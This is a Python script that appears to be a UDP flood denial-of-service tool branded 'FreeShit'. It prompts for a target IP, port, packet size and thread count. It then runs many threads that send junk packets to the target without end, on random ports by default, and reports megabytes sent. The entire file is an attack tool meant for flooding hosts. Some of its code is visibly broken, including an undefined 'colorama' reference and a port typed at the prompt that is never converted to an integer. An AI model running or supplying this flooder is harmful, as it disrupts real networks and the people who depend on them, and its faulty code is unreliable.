import socket
from random import randint
from colorama import Fore, init
import threading

init()

banner = f"""
{colorama.Fore.RED}███████╗██████╗ ███████╗███████╗███████╗██╗  ██╗██╗████████╗
{colorama.Fore.GREEN}██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝██║  ██║██║╚══██╔══╝  
{colorama.Fore.RED}█████╗  ██████╔╝█████╗  █████╗  ███████╗███████║██║   ██║      
{colorama.Fore.GREEN}██╔══╝  ██╔══██╗██╔══╝  ██╔══╝  ╚════██║██╔══██║██║   ██║    
{colorama.Fore.RED}██║     ██║  ██║███████╗███████╗███████║██║  ██║██║   ██║     
{colorama.Fore.GREEN}╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝ 
{colorama.Fore.RED}Created By FreeShit ║ Dev: segations#2344 ║ getfreeshit.today
{colorama.Fore.GREEN}                      Version 2.0.0
"""

print(banner)

data = 0
wow = 0

target = input(f"{Fore.RED} Target IP: ")
port = input(f"{Fore.RED} Target Port {Fore.CYAN}[press {Fore.GREEN}enter {Fore.CYAN}to do all ports]: ")
by = input(f'{Fore.RED} Number of bytes per packet {Fore.CYAN}[press {Fore.GREEN}enter {Fore.CYAN}for 1250]: ')
tnum = input(f'{Fore.RED} Number of threads {Fore.CYAN}[press {Fore.GREEN}enter {Fore.CYAN}for 100]: ')

if by == '':
    by = 1250
else:
    by = int(by)
if tnum == '':
    tnum = 100
else:
    tnum = int(tnum)

load = str.encode('L' * by)

def tport():
    return port or randint(1, 65535)
def ranaddr():
    return (target, tport())
    
#can change to SOCK_STREAM for tcp
#can change to SOCK_DGRAM for udp

ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def attack():
    global data, wow
    while True:
        ddos.sendto(load, ranaddr())
        data = int(data) + int(by)
        wow = round(data/1000000,1)
        print("\r" + f'{wow} mb sent', end="")

for i in range(tnum):
    thread = threading.Thread(target = attack)
    thread.start()
